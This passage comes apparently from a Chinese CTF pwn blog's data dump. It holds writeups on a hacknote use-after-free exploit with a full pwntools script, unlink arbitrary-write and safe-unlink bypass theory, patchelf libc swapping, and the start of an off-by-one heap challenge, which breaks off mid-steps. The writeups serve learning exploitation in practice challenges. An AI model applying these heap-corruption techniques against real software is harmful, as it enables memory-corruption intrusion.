class=\"hljs-type\">char</span> buf[<span class=\"hljs-number\">4</span>];<br>  <span class=\"hljs-type\">int</span> idx;<br>  <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;Index :&quot;</span>);<br>  read(<span class=\"hljs-number\">0</span>, buf, <span class=\"hljs-number\">4</span>);<br>  idx = atoi(buf);<br>  <span class=\"hljs-keyword\">if</span> (idx &lt; <span class=\"hljs-number\">0</span> || idx &gt;= count) &#123;<br>    <span class=\"hljs-built_in\">puts</span>(<span class=\"hljs-string\">&quot;Out of bound!&quot;</span>);<br>    _exit(<span class=\"hljs-number\">0</span>);<br>  &#125;<br>  <span class=\"hljs-keyword\">if</span> (notelist[idx]) &#123;<br>    <span class=\"hljs-built_in\">free</span>(notelist[idx]-&gt;content);<br>    <span class=\"hljs-built_in\">free</span>(notelist[idx]);<br>    <span class=\"hljs-built_in\">puts</span>(<span class=\"hljs-string\">&quot;Success&quot;</span>);<br>  &#125;<br>&#125;<br><span class=\"hljs-comment\">// 并且在add_note中是根据notelist[i]是否为nullptr判断在哪个位置add新note</span><br></code></pre></td></tr></table></figure>\n\n<p>程序中给了system：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs C\"><span class=\"hljs-type\">int</span> <span class=\"hljs-title function_\">magic</span><span class=\"hljs-params\">()</span><br>&#123;<br>  <span class=\"hljs-keyword\">return</span> system(<span class=\"hljs-string\">&quot;cat flag&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure>\n\n<h4 id=\"漏洞利用方法\"><a href=\"#漏洞利用方法\" class=\"headerlink\" title=\"漏洞利用方法\"></a>漏洞利用方法</h4><p>exp如下</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs python\">add(<span class=\"hljs-number\">0x20</span>, <span class=\"hljs-string\">&#x27;aaaa\\n&#x27;</span>)<br>add(<span class=\"hljs-number\">0x20</span>, <span class=\"hljs-string\">&#x27;bbbb\\n&#x27;</span>)<br>delete(<span class=\"hljs-number\">0</span>)<br>delete(<span class=\"hljs-number\">1</span>)<br>add(<span class=\"hljs-number\">0x8</span>, p32(magic))<br>show(<span class=\"hljs-number\">0</span>)<br></code></pre></td></tr></table></figure>\n\n<p>下面介绍这个exp的原理</p>\n<p>在delete 0和1之后fastbin结构如下图</p>\n<div class=\"mxgraph\" style=\"max-width:100%;border:1px solid transparent;\" data-mxgraph=\"{&quot;highlight&quot;:&quot;#0000ff&quot;,&quot;nav&quot;:true,&quot;resize&quot;:true,&quot;xml&quot;:&quot;&lt;mxfile host=\\&quot;app.diagrams.net\\&quot; modified=\\&quot;2022-11-22T16:47:04.851Z\\&quot; agent=\\&quot;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36\\&quot; etag=\\&quot;xMjKslWb0NtHo6yfLEq6\\&quot; version=\\&quot;20.5.3\\&quot; type=\\&quot;device\\&quot;&gt;&lt;diagram id=\\&quot;wU8d93oxY3eO_jrvUp61\\&quot; name=\\&quot;第 1 页\\&quot;&gt;7VlZj9sgEP4tfbDUPqRyfOR43CTbXamt1GrVdts3YmMbBYOLydVfXzDgM8c2qyZZaV9imBkG+Ga+ATuWO003dwxkyWcaQmw5drix3JnlOP3h2BYPKdkqycjVgpihUBtVggf0B2qhMVuiEOYNQ04p5ihrCgNKCAx4QwYYo+umWURxc9YMxLAjeAgA7kp/oJAnehfOsJLfQxQnZub+YKw0KTDGeid5AkK6roncW8udMkq5aqWbKcQSPIOLGvdhj7ZcGIOEP2XA6uun4bfsz+BxDqPo4+Ps1/dl2hsoLyuAl3rD1tSxJkP96wxAmlnuhMxz+bDkFNcoqq/56b+XX/du0Wm7ORGDIjX51uQ7o0sSQpkytljNOkEcPmQgkNq1YLiQJTzFotcXzYgSrinrjIrFt1NSZ+kKMg43NZFO0TtIU8jZVpgYraGLrheur/vrin2+qSFJjXkDLQOa8HHpuuKEaGha/ANFhl2KOAMsZp3kGSAN9Aa/l5LNk4Biyiz3RihZPH8rViamts3jnQqzBK8XgRThrTK9h3gFOQpATZ8X6EqtM8o2dYWaVGoIZSnANd0KMATEE6MY8CWT5fOgXQCyfSZrjbBUeratNBhyDllPbD9AJO6OpCxLANEuHSUT4ec9IFZElDgQKQJZTYdE2hE9k222Wmg4E84i4d/MRKDSipQo6nttmjVlYXNhpS+xl/kCCXfSZ84ZXcCeTqqG3RwEi7igQa8VR8cbqRA63lg3fBPNwmsIA8oAR5T0eIKCBYG5Xh4iiCODT9u2FsuDdrXlNOwiTAFvgxOiPMNga8wxEgrHfoPSjDIOJNKTKmFFK5bPCORcQoBE9HSSC86oPFcWnYIhF3neSnGgMvS9c1aG0Y7KcG3l1D9eTsuSexbQxtcPmju4NtDMbfgQapCEN/LCK3oBBnmOgiZQTVTbsMEN4o9S997XvZ96nGzPNnpY0dnqzl6oc7pkATzOHBg2Lt/dgNQP/R14GxmDWFTIVfPKvisIeoYvFBFexdv3mvH2/FYc1X70qPoVu+WofGsxjoYtRxywGPKOoyInym0/I02cTpoEyZIshGhq6vmcmVJub0bdcn5p7rULVgnh5bjnvSjuXQmn2lQo7+zP5ZQ/PjOn/L2cunmhnCohvByndnx3eOXUMU55rXdjr38ipzqOzn1Odd+pDadmuzjl2NdHqvYl8QoOqie8j7yS6hgXTj6oOo7OfVB136wMqSYvlVT/86QS3erjuwpC9ReGe/sX&lt;/diagram&gt;&lt;/mxfile&gt;&quot;,&quot;toolbar&quot;:&quot;pages zoom layers lightbox&quot;,&quot;page&quot;:0}\"></div>\n<script type=\"text/javascript\" src=\"https://app.diagrams.net/js/viewer-static.min.js\"></script>\n\n<p>chunk A是申请的<code>note[0]</code>结构体的空间，chunk B是<code>note[0]-&gt;content</code>的空间</p>\n<p>chunk C、D是<code>note[1]</code>的空间</p>\n<p>由于fastbin会把同样大小的块放在同一个链表上，因此两个0x8大小的chunk A、 chunk C会被连在一起，并且由于fastbin使用的是先进后出的单向链表，A在C下面。</p>\n<p>当申请一个content大小为0x8的新的note时，会将A和C从fastbin中取出。先malloc结构体本身，使用chunk C，然后malloc content，使用chunk A。</p>\n<p>因此<code>add(0x8,p32(magic))</code>会把magic地址写入content，调用show的时候，会直接执行这个函数。</p>\n<p>理论是如此，下面用gdb验证一下</p>\n<h4 id=\"调试\"><a href=\"#调试\" class=\"headerlink\" title=\"调试\"></a>调试</h4><p>完整exp，在两次add、两次delete、最后一次add之后分别attach查看notelist</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs python\"><span class=\"hljs-keyword\">from</span> pwn <span class=\"hljs-keyword\">import</span> *<br>r = process(file_name)<br>elf = ELF(<span class=\"hljs-string\">&#x27;./hacknote&#x27;</span>)<br>menu = <span class=\"hljs-string\">&#x27;Your choice :&#x27;</span><br><br><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title function_\">add</span>(<span class=\"hljs-params\">size, content</span>):<br>    r.sendlineafter(menu, <span class=\"hljs-string\">&#x27;1&#x27;</span>)<br>    r.sendlineafter(<span class=\"hljs-string\">&#x27;Note size :&#x27;</span>, <span class=\"hljs-built_in\">str</span>(size))<br>    r.sendafter(<span class=\"hljs-string\">&#x27;Content :&#x27;</span>, content)<br><br><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title function_\">delete</span>(<span class=\"hljs-params\">index</span>):<br>    r.sendlineafter(menu, <span class=\"hljs-string\">&#x27;2&#x27;</span>)<br>    r.sendlineafter(<span class=\"hljs-string\">&#x27;Index :&#x27;</span>, <span class=\"hljs-built_in\">str</span>(index))<br><br><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title function_\">show</span>(<span class=\"hljs-params\">index</span>):<br>    r.sendlineafter(menu, <span class=\"hljs-string\">&#x27;3&#x27;</span>)<br>    r.sendlineafter(<span class=\"hljs-string\">&#x27;Index :&#x27;</span>, <span class=\"hljs-built_in\">str</span>(index))<br><br><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title function_\">dbg</span>():<br>    gdb.attach(r)<br><br>add(<span class=\"hljs-number\">0x20</span>, <span class=\"hljs-string\">&#x27;aaaa\\n&#x27;</span>)<br>add(<span class=\"hljs-number\">0x20</span>, <span class=\"hljs-string\">&#x27;bbbb\\n&#x27;</span>)<br>dbg()<br>delete(<span class=\"hljs-number\">0</span>)<br>delete(<span class=\"hljs-number\">1</span>)<br>dbg()<br>magic = <span class=\"hljs-number\">0x08048986</span><br>add(<span class=\"hljs-number\">0x8</span>, p32(magic))<br>dbg()<br>show(<span class=\"hljs-number\">0</span>)<br>r.interactive()<br></code></pre></td></tr></table></figure>\n\n<p>在ida中可以看到notelist的地址</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs assembly\">.bss:0804A070 ; void *notelist<br>.bss:0804A070 notelist        dd ?                    ; DATA XREF: add_note+40↑r<br>.bss:0804A070                                         ; add_note+61↑w ...<br>.bss:0804A074                 db    ? ;<br></code></pre></td></tr></table></figure>\n\n<p>查看三次notelist的内容，</p>\n<p><img src=\"/img/UAF/1.jpg\"></p>\n<p><img src=\"/img/UAF/2.jpg\"></p>\n<p><img src=\"/img/UAF/3.jpg\"></p>\n<p>可以看到，<code>0x92f31a0</code>上的地址为print_note函数的地址，在free之前，<code>0x92f31a4</code>上的内容指向下一行开头，即<code>aaaa</code>字符串，所以这里就是note[0]。</p>\n<p>在第三次add之后改变了note[0]原本在print_note上的函数指针，因此show(0)时会执行magic</p>\n"},{"title":"unlink","date":"2022-11-25T02:19:00.000Z","excerpt":"unlink","_content":"\n> 以下内容一律假设 sz = 4 bytes  ，32位系统\n\n#### unlink时向任意地址写入数据原理\n\n假设需要从bin中摘除一个**首地址为P**的chunk\n\n32位系统下，fd相对于块首的偏移为8（prevsize和size都是4字节），bk偏移为12\n\n即 `fd = P+8 ` ，`bk = P+12`\n\n```C\n// unlink时需要 将P.fd指向的块的bk 赋值为 P.bk上的值\n*(*(P+8)+12) = *(P+12)\n// 将P.bk指向的块的fd 赋值为 P.fd上的值\n*(*(P+12)+8) = *(P+8)\n```\n\n假设想要向0x4000000C这个地址上写入0xdeadbeef这个值\n\n只需将`*(P+8)`赋值为0x40000000，将`*(P+12)`赋值为0xdeadbeef，在unlink时就会完成赋值\n\n这种方法是将fd设置为了target addr - 12 ，bk设置为了expect value\n\n> 也可以将fd设置为expect value，bk设置为target addr - 8，但是后文默认均使用前一种攻击方法\n\nunlink漏洞同时向两个地址进行了写入，所以在保证targe taddr -12 可以写入的同时，也要保证expect value + 8 有写入权限\n\n#### 加入检查机制之后\n\n```C\nFD = P->fd;\nBK = P->bk;\nif (__builtin_expect (FD->bk != P || BK->fd != P, 0))                      \n  malloc_printerr (check_action, \"corrupted double-linked list\", P, AV); \nFD->bk = BK;\nBK->fd = FD;\n```\n\n因此溢出时需要额外保证以下条件\n\n```\n*(*(P+8) +12) == P\n*(*(P+12)+ 8) == P\n```\n\n所以需要找到堆管理列表里面指向chunk P的指针**ptr**，让P的fd指向ptr-12，P的bk指向ptr-8，这样P->fd->bk指向P，P->bk->fd也指向P。\n\n绕过if判断之后，下面两条赋值语句首先将 FD->bk（也就是ptr）指向了BK，再将BK->fd（还是ptr，又改变了一次ptr）指向了FD。\n\n因此后面这两条赋值语句确实完成了FD和BK unlink 的效果，唯一被改变的是ptr，它从原本指向chunk p，变成了*(ptr - 12)\n\n#### 利用方法\n\n见文章 ：stkof\n\n","source":"_posts/unlink.md","raw":"---\ntitle: unlink \ntags: [ctf-pwn]\ndate: 2022-11-25 10:19:00\nexcerpt: unlink \n---\n\n> 以下内容一律假设 sz = 4 bytes  ，32位系统\n\n#### unlink时向任意地址写入数据原理\n\n假设需要从bin中摘除一个**首地址为P**的chunk\n\n32位系统下，fd相对于块首的偏移为8（prevsize和size都是4字节），bk偏移为12\n\n即 `fd = P+8 ` ，`bk = P+12`\n\n```C\n// unlink时需要 将P.fd指向的块的bk 赋值为 P.bk上的值\n*(*(P+8)+12) = *(P+12)\n// 将P.bk指向的块的fd 赋值为 P.fd上的值\n*(*(P+12)+8) = *(P+8)\n```\n\n假设想要向0x4000000C这个地址上写入0xdeadbeef这个值\n\n只需将`*(P+8)`赋值为0x40000000，将`*(P+12)`赋值为0xdeadbeef，在unlink时就会完成赋值\n\n这种方法是将fd设置为了target addr - 12 ，bk设置为了expect value\n\n> 也可以将fd设置为expect value，bk设置为target addr - 8，但是后文默认均使用前一种攻击方法\n\nunlink漏洞同时向两个地址进行了写入，所以在保证targe taddr -12 可以写入的同时，也要保证expect value + 8 有写入权限\n\n#### 加入检查机制之后\n\n```C\nFD = P->fd;\nBK = P->bk;\nif (__builtin_expect (FD->bk != P || BK->fd != P, 0))                      \n  malloc_printerr (check_action, \"corrupted double-linked list\", P, AV); \nFD->bk = BK;\nBK->fd = FD;\n```\n\n因此溢出时需要额外保证以下条件\n\n```\n*(*(P+8) +12) == P\n*(*(P+12)+ 8) == P\n```\n\n所以需要找到堆管理列表里面指向chunk P的指针**ptr**，让P的fd指向ptr-12，P的bk指向ptr-8，这样P->fd->bk指向P，P->bk->fd也指向P。\n\n绕过if判断之后，下面两条赋值语句首先将 FD->bk（也就是ptr）指向了BK，再将BK->fd（还是ptr，又改变了一次ptr）指向了FD。\n\n因此后面这两条赋值语句确实完成了FD和BK unlink 的效果，唯一被改变的是ptr，它从原本指向chunk p，变成了*(ptr - 12)\n\n#### 利用方法\n\n见文章 ：stkof\n\n","slug":"unlink","published":1,"updated":"2022-11-26T13:31:58.821Z","comments":1,"layout":"post","photos":[],"link":"","_id":"claxz2tb30000xsufcm8cb4c1","content":"<blockquote>\n<p>以下内容一律假设 sz = 4 bytes  ，32位系统</p>\n</blockquote>\n<h4 id=\"unlink时向任意地址写入数据原理\"><a href=\"#unlink时向任意地址写入数据原理\" class=\"headerlink\" title=\"unlink时向任意地址写入数据原理\"></a>unlink时向任意地址写入数据原理</h4><p>假设需要从bin中摘除一个<strong>首地址为P</strong>的chunk</p>\n<p>32位系统下，fd相对于块首的偏移为8（prevsize和size都是4字节），bk偏移为12</p>\n<p>即 <code>fd = P+8 </code> ，<code>bk = P+12</code></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs C\"><span class=\"hljs-comment\">// unlink时需要 将P.fd指向的块的bk 赋值为 P.bk上的值</span><br>*(*(P+<span class=\"hljs-number\">8</span>)+<span class=\"hljs-number\">12</span>) = *(P+<span class=\"hljs-number\">12</span>)<br><span class=\"hljs-comment\">// 将P.bk指向的块的fd 赋值为 P.fd上的值</span><br>*(*(P+<span class=\"hljs-number\">12</span>)+<span class=\"hljs-number\">8</span>) = *(P+<span class=\"hljs-number\">8</span>)<br></code></pre></td></tr></table></figure>\n\n<p>假设想要向0x4000000C这个地址上写入0xdeadbeef这个值</p>\n<p>只需将<code>*(P+8)</code>赋值为0x40000000，将<code>*(P+12)</code>赋值为0xdeadbeef，在unlink时就会完成赋值</p>\n<p>这种方法是将fd设置为了target addr - 12 ，bk设置为了expect value</p>\n<blockquote>\n<p>也可以将fd设置为expect value，bk设置为target addr - 8，但是后文默认均使用前一种攻击方法</p>\n</blockquote>\n<p>unlink漏洞同时向两个地址进行了写入，所以在保证targe taddr -12 可以写入的同时，也要保证expect value + 8 有写入权限</p>\n<h4 id=\"加入检查机制之后\"><a href=\"#加入检查机制之后\" class=\"headerlink\" title=\"加入检查机制之后\"></a>加入检查机制之后</h4><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs C\">FD = P-&gt;fd;<br>BK = P-&gt;bk;<br><span class=\"hljs-keyword\">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class=\"hljs-number\">0</span>))                      <br>  malloc_printerr (check_action, <span class=\"hljs-string\">&quot;corrupted double-linked list&quot;</span>, P, AV); <br>FD-&gt;bk = BK;<br>BK-&gt;fd = FD;<br></code></pre></td></tr></table></figure>\n\n<p>因此溢出时需要额外保证以下条件</p>\n<figure class=\"highlight lisp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs lisp\">*(<span class=\"hljs-name\">*</span>(<span class=\"hljs-name\">P+8</span>) <span class=\"hljs-number\">+12</span>) == P<br>*(<span class=\"hljs-name\">*</span>(<span class=\"hljs-name\">P+12</span>)+ <span class=\"hljs-number\">8</span>) == P<br></code></pre></td></tr></table></figure>\n\n<p>所以需要找到堆管理列表里面指向chunk P的指针<strong>ptr</strong>，让P的fd指向ptr-12，P的bk指向ptr-8，这样P-&gt;fd-&gt;bk指向P，P-&gt;bk-&gt;fd也指向P。</p>\n<p>绕过if判断之后，下面两条赋值语句首先将 FD-&gt;bk（也就是ptr）指向了BK，再将BK-&gt;fd（还是ptr，又改变了一次ptr）指向了FD。</p>\n<p>因此后面这两条赋值语句确实完成了FD和BK unlink 的效果，唯一被改变的是ptr，它从原本指向chunk p，变成了*(ptr - 12)</p>\n<h4 id=\"利用方法\"><a href=\"#利用方法\" class=\"headerlink\" title=\"利用方法\"></a>利用方法</h4><p>见文章 ：stkof</p>\n","site":{"data":{}},"more":"<blockquote>\n<p>以下内容一律假设 sz = 4 bytes  ，32位系统</p>\n</blockquote>\n<h4 id=\"unlink时向任意地址写入数据原理\"><a href=\"#unlink时向任意地址写入数据原理\" class=\"headerlink\" title=\"unlink时向任意地址写入数据原理\"></a>unlink时向任意地址写入数据原理</h4><p>假设需要从bin中摘除一个<strong>首地址为P</strong>的chunk</p>\n<p>32位系统下，fd相对于块首的偏移为8（prevsize和size都是4字节），bk偏移为12</p>\n<p>即 <code>fd = P+8 </code> ，<code>bk = P+12</code></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs C\"><span class=\"hljs-comment\">// unlink时需要 将P.fd指向的块的bk 赋值为 P.bk上的值</span><br>*(*(P+<span class=\"hljs-number\">8</span>)+<span class=\"hljs-number\">12</span>) = *(P+<span class=\"hljs-number\">12</span>)<br><span class=\"hljs-comment\">// 将P.bk指向的块的fd 赋值为 P.fd上的值</span><br>*(*(P+<span class=\"hljs-number\">12</span>)+<span class=\"hljs-number\">8</span>) = *(P+<span class=\"hljs-number\">8</span>)<br></code></pre></td></tr></table></figure>\n\n<p>假设想要向0x4000000C这个地址上写入0xdeadbeef这个值</p>\n<p>只需将<code>*(P+8)</code>赋值为0x40000000，将<code>*(P+12)</code>赋值为0xdeadbeef，在unlink时就会完成赋值</p>\n<p>这种方法是将fd设置为了target addr - 12 ，bk设置为了expect value</p>\n<blockquote>\n<p>也可以将fd设置为expect value，bk设置为target addr - 8，但是后文默认均使用前一种攻击方法</p>\n</blockquote>\n<p>unlink漏洞同时向两个地址进行了写入，所以在保证targe taddr -12 可以写入的同时，也要保证expect value + 8 有写入权限</p>\n<h4 id=\"加入检查机制之后\"><a href=\"#加入检查机制之后\" class=\"headerlink\" title=\"加入检查机制之后\"></a>加入检查机制之后</h4><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs C\">FD = P-&gt;fd;<br>BK = P-&gt;bk;<br><span class=\"hljs-keyword\">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class=\"hljs-number\">0</span>))                      <br>  malloc_printerr (check_action, <span class=\"hljs-string\">&quot;corrupted double-linked list&quot;</span>, P, AV); <br>FD-&gt;bk = BK;<br>BK-&gt;fd = FD;<br></code></pre></td></tr></table></figure>\n\n<p>因此溢出时需要额外保证以下条件</p>\n<figure class=\"highlight lisp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs lisp\">*(<span class=\"hljs-name\">*</span>(<span class=\"hljs-name\">P+8</span>) <span class=\"hljs-number\">+12</span>) == P<br>*(<span class=\"hljs-name\">*</span>(<span class=\"hljs-name\">P+12</span>)+ <span class=\"hljs-number\">8</span>) == P<br></code></pre></td></tr></table></figure>\n\n<p>所以需要找到堆管理列表里面指向chunk P的指针<strong>ptr</strong>，让P的fd指向ptr-12，P的bk指向ptr-8，这样P-&gt;fd-&gt;bk指向P，P-&gt;bk-&gt;fd也指向P。</p>\n<p>绕过if判断之后，下面两条赋值语句首先将 FD-&gt;bk（也就是ptr）指向了BK，再将BK-&gt;fd（还是ptr，又改变了一次ptr）指向了FD。</p>\n<p>因此后面这两条赋值语句确实完成了FD和BK unlink 的效果，唯一被改变的是ptr，它从原本指向chunk p，变成了*(ptr - 12)</p>\n<h4 id=\"利用方法\"><a href=\"#利用方法\" class=\"headerlink\" title=\"利用方法\"></a>利用方法</h4><p>见文章 ：stkof</p>\n"},{"title":"patchelf修改libc版本","date":"2022-11-27T08:00:00.000Z","excerpt":"修改libc版本","_content":"\n#### 安装glibc-all-in-one\n\n```shell\ngit clone https://github.com/matrix1001/glibc-all-in-one\ncd glibc-all-in-one\n./update_list\ncat list \n./download <libc-in-list>\n```\n\n#### 修改libc.so和ld.so\n\n```sh\npatchelf --set-interpreter ./glibc-all-in-one/libs/2.23-0ubuntu3_amd64/ld-2.23.so  <path-to-elf>\n\npatchelf --replace-needed libc.so.6 ./glibc-all-in-one/libs/2.23-0ubuntu3_amd64/libc.so.6  <path-to-elf>\n# param1 : old libc.so\n# param2 : new libc.so\n# param3 : path to elf\n```\n\n\n\n#### 效果图\n\n![](/img/patchelf/1.png)\n\n","source":"_posts/patchelf修改程序libc版本.md","raw":"---\ntitle: patchelf修改libc版本\ntags: [ctf-pwn]\ndate: 2022-11-27 16:00:00\nexcerpt: 修改libc版本\n---\n\n#### 安装glibc-all-in-one\n\n```shell\ngit clone https://github.com/matrix1001/glibc-all-in-one\ncd glibc-all-in-one\n./update_list\ncat list \n./download <libc-in-list>\n```\n\n#### 修改libc.so和ld.so\n\n```sh\npatchelf --set-interpreter ./glibc-all-in-one/libs/2.23-0ubuntu3_amd64/ld-2.23.so  <path-to-elf>\n\npatchelf --replace-needed libc.so.6 ./glibc-all-in-one/libs/2.23-0ubuntu3_amd64/libc.so.6  <path-to-elf>\n# param1 : old libc.so\n# param2 : new libc.so\n# param3 : path to elf\n```\n\n\n\n#### 效果图\n\n![](/img/patchelf/1.png)\n\n","slug":"patchelf修改程序libc版本","published":1,"updated":"2022-11-27T08:04:03.223Z","_id":"claz2knfu0000isuf008c0h1e","comments":1,"layout":"post","photos":[],"link":"","content":"<h4 id=\"安装glibc-all-in-one\"><a href=\"#安装glibc-all-in-one\" class=\"headerlink\" title=\"安装glibc-all-in-one\"></a>安装glibc-all-in-one</h4><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs shell\">git clone https://github.com/matrix1001/glibc-all-in-one<br>cd glibc-all-in-one<br>./update_list<br>cat list <br>./download &lt;libc-in-list&gt;<br></code></pre></td></tr></table></figure>\n\n<h4 id=\"修改libc-so和ld-so\"><a href=\"#修改libc-so和ld-so\" class=\"headerlink\" title=\"修改libc.so和ld.so\"></a>修改libc.so和ld.so</h4><figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs sh\">patchelf --set-interpreter ./glibc-all-in-one/libs/2.23-0ubuntu3_amd64/ld-2.23.so  &lt;path-to-elf&gt;<br><br>patchelf --replace-needed libc.so.6 ./glibc-all-in-one/libs/2.23-0ubuntu3_amd64/libc.so.6  &lt;path-to-elf&gt;<br><span class=\"hljs-comment\"># param1 : old libc.so</span><br><span class=\"hljs-comment\"># param2 : new libc.so</span><br><span class=\"hljs-comment\"># param3 : path to elf</span><br></code></pre></td></tr></table></figure>\n\n\n\n<h4 id=\"效果图\"><a href=\"#效果图\" class=\"headerlink\" title=\"效果图\"></a>效果图</h4><p><img src=\"/img/patchelf/1.png\"></p>\n","site":{"data":{}},"more":"<h4 id=\"安装glibc-all-in-one\"><a href=\"#安装glibc-all-in-one\" class=\"headerlink\" title=\"安装glibc-all-in-one\"></a>安装glibc-all-in-one</h4><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs shell\">git clone https://github.com/matrix1001/glibc-all-in-one<br>cd glibc-all-in-one<br>./update_list<br>cat list <br>./download &lt;libc-in-list&gt;<br></code></pre></td></tr></table></figure>\n\n<h4 id=\"修改libc-so和ld-so\"><a href=\"#修改libc-so和ld-so\" class=\"headerlink\" title=\"修改libc.so和ld.so\"></a>修改libc.so和ld.so</h4><figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs sh\">patchelf --set-interpreter ./glibc-all-in-one/libs/2.23-0ubuntu3_amd64/ld-2.23.so  &lt;path-to-elf&gt;<br><br>patchelf --replace-needed libc.so.6 ./glibc-all-in-one/libs/2.23-0ubuntu3_amd64/libc.so.6  &lt;path-to-elf&gt;<br><span class=\"hljs-comment\"># param1 : old libc.so</span><br><span class=\"hljs-comment\"># param2 : new libc.so</span><br><span class=\"hljs-comment\"># param3 : path to elf</span><br></code></pre></td></tr></table></figure>\n\n\n\n<h4 id=\"效果图\"><a href=\"#效果图\" class=\"headerlink\" title=\"效果图\"></a>效果图</h4><p><img src=\"/img/patchelf/1.png\"></p>\n"},{"title":"Off-By-One","date":"2022-11-27T11:00:00.000Z","excerpt":"堆中的 off-by-one 漏洞, hitcon_heapcreator exp","_content":"\n#### Off-By-One漏洞如何产生\n\n1. 循环多一次\n\n   ```C\n   x = malloc(10);\n   for(int i=0;i<=10;i++)\n   {\n       x[i] = getchar();\n   }\n   ```\n\n   x的下一个chunk第一个字节被溢出了\n\n2. `strlen`和`strcpy`行为不一致\n\n   ```C\n   if(strlen(buffer)==100)\n   {\n       strcpy(chunk,buffer);\n   }\n   ```\n\n   `strlen`返回值不算结束符'`\\0`，而`strcpy`复制时会把结束符在内的101个字符复制过去\n   \n   \n\n#### hitcon_creator\n\n题目来源\n\n<https://buuoj.cn/challenges#hitcontraining_heapcreator>\n\n##### 1. create\n\n![](/img/off_by_one/1.png)\n\n从上述结构可以推断出heaparray是如下结构\n\n```C\nstruct heaparray_item{\n    int_64   size;\n    char * content;\n}\nstruct heaparray_item * heaparray[10];\n```\n\n\n\n##### 2. edit\n\n```C\nif ( *(&heaparray + v1) )\n{\n    printf(\"Content of heap : \");\n    read_input(*((_QWORD *)*(&heaparray + v1) + 1), *(_QWORD *)*(&heaparray + v1) + 1LL);\n    puts(\"Done !\");\n}\n```\n\n`read_input`读取size+1字节，出现了off_by_one漏洞\n\n可以覆盖下一个chunk的size字段\n\n\n\n##### 漏洞利用\n\n1. 申请三个堆块，大小为0x18,0x10,0x10，加上三次size申请的0x10，一共6个chunk\n\n    ![](/img/off_by_one/2.jpg)\n\n2. 修改0号块，写入`/bin/sh`，然后再溢出`0x81`到下一个chunk的size\n\n   ![](/img/off_by_one/3.jpg)\n\n3. 